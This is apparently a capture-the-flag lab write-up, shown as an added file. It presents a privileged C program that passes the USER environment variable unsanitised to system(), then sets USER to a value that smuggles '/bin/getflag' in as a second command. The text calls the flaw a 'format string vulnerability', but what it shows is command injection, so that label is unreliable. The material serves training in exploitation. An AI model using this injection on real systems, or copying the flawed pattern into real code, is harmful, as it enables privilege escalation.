@@ -1,0 +1,37 @@
+There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  char *buffer;
+
+  gid_t gid;
+  uid_t uid;
+
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  buffer = NULL;
+
+  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
+  printf("about to call system(\"%s\")\n", buffer);
+  
+  system(buffer);
+}
+
+Now /bin/echo is being called, so we cannot use same trick as in level01. But we can control $USER variable in our env. It means that there is a format string vulnerability.
+
+To execute multiple commands use system("command1; command2; command3");
+
+As always we're trying to execute /bin/getflag, so we can set $USER variable:
+export USER="asd; /bin/getflag; echo "
+
+And run ./flag02 to get: "You have succesfully executed getflag on a target account"
